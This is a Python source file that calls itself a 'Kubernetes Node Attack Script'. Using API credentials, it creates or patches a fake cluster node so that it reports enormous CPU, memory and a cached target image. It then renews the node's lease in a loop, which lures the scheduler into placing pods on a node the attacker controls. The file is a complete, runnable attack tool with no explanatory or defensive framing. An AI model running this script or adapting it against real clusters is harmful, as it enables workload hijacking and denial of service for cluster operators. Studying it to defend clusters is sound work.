from kubernetes import client, config, watch
import json
import datetime
import time
import sys
import argparse

OKGREEN = '\033[92m'
FAIL = '\033[91m'
ENDC = '\033[0m'

parser = argparse.ArgumentParser(description="Kubernetes Node Attack Script")
parser.add_argument("node_name", type=str, help="Name of the node")
parser.add_argument("--create-node", action="store_true", help="Create the node if set")
parser.add_argument("--target-image", type=str, help="Target image name")
parser.add_argument("--kube-config", type=str, help="Path to kubeconfig file")
parser.add_argument("--delete", action="store_true", help="Delete the node if set")
parser.add_argument("--provider-id", type=str, help="Provider ID of the node")

args = parser.parse_args()

if args.create_node and args.delete:
  print("Error: --create-node and --delete cannot be set at the same time.")
  sys.exit(1)

args = parser.parse_args()

node_name          = args.node_name
delete_node_option = args.delete
create_node_option = args.create_node
target_image       = args.target_image if args.target_image else "busybox:latest"
config_file        = args.kube_config if args.kube_config else ""
provider_id        = args.provider_id if args.provider_id else ""

def get_time():
    return f"{(datetime.datetime.now() - datetime.timedelta(hours=1)).isoformat()}Z"

def generate_conditions():
  return [
      {
        "type": "MemoryPressure",
        "status": "False",
        "lastHeartbeatTime": get_time(),
        "lastTransitionTime": get_time(),
        "reason": "KubeletHasSufficientMemory",
        "message": "kubelet has sufficient memory available"
      },
      {
        "type": "DiskPressure",
        "status": "False",
        "lastHeartbeatTime": get_time(),
        "lastTransitionTime": get_time(),
        "reason": "KubeletHasNoDiskPressure",
        "message": "kubelet has no disk pressure"
      },
      {
        "type": "PIDPressure",
        "status": "False",
        "lastHeartbeatTime": get_time(),
        "lastTransitionTime": get_time(),
        "reason": "KubeletHasSufficientPID",
        "message": "kubelet has sufficient PID available"
      },
      {
        "type": "Ready",
        "status": "True",
        "lastHeartbeatTime": get_time(),
        "lastTransitionTime": get_time(),
        "reason": "KubeletReady",
        "message": "kubelet is posting ready status"
      }
    ]

def create_node(v1, coordination_api, node_name, labels = {}):
  body = {
    "metadata": {
      "name": node_name,
      "labels": labels,
      # "finalizers": [
      #   "test/test" # This prevents the deletion of the node
      # ]
    },
    "status": {
       "conditions": generate_conditions()
    }
  }
  if provider_id:
    body["spec"] = {
      "providerID": provider_id
    }
    print(f"[+] Provider ID set to {provider_id}")
  v1.create_node(body)
  print(f"[+] Node {node_name} created")

  body =  {
    "metadata" : {
      "name": node_name
    },
  }
  try:
    coordination_api.create_namespaced_lease("kube-node-lease", body)
    print(f"[+] Lease for {node_name} created")
  except:
    print(f"[+] Lease for {node_name} already exists")
  return True

def patch_node(v1, node_name):
  body = {
    "status": {
      "allocatable": {
        "cpu": "2000",
        "memory": "10000Gi",
        "pods": "400",
      },
      "capacity": {
        "cpu": "4000",
        "memory": "20000Gi",
        "pods": "400",
      },
      "images": [
        {
          "names": [
            target_image
          ],
          "sizeBytes": 100000000000
        }
      ],
      "conditions": generate_conditions(),
      "nodeInfo": {
        "kubeletVersion": "v1.30.5-gke.1443001"
      }
    }
  }
  v1.patch_node_status(node_name, body)
  print(f"[+] Node {node_name} patched with oversized resources")
  return True

def keep_alive(coordination_api, node_name):
  coordination_api.patch_namespaced_lease(node_name, "kube-node-lease", {
      "spec": {
          "renewTime": get_time(),
      }
  })

def is_node_ready(v1, node_name):
  node = v1.read_node(node_name)
  for condition in node.status.conditions:
    if condition.type == "Ready" and condition.status == "True":
      return True
  return False

def remove_node(v1, coordination_api, node_name):
  # body = {
  #   "metadata": {
  #     "finalizers": [] # Not working, can only add finalzer, not remove them
  #   }
  # }
  # v1.patch_node(name=node_name, body=body)
  # print(f"[+] Finalizer removed from node {node_name}")

  coordination_api.delete_namespaced_lease(node_name, "kube-node-lease")
  print(f"[+] Lease for {node_name} deleted")

# ----------- End of helpers ------------

if config_file:
  config.load_kube_config(config_file=config_file)
else:
  config.load_kube_config()

coordination_api = client.CoordinationV1Api()
v1               = client.CoreV1Api()

if delete_node_option:
  remove_node(v1, coordination_api, node_name)
  sys.exit(0)

if create_node_option:
  create_node(v1, coordination_api, node_name, {"node-type": "kne"})

patch_node(v1, node_name)

# Keep the node alive
status = ""
while True:
  status = "." * ((len(status) + 1) % 4)
  keep_alive(coordination_api, node_name)
  if is_node_ready(v1, node_name):
    print(f"\r{OKGREEN}[+] Node {node_name} is ready{status}{ENDC}   ", end="")
  else:
    print(f"\r{FAIL}[-] Node {node_name} is not ready{status}{ENDC}   ", end="")
  time.sleep(10)
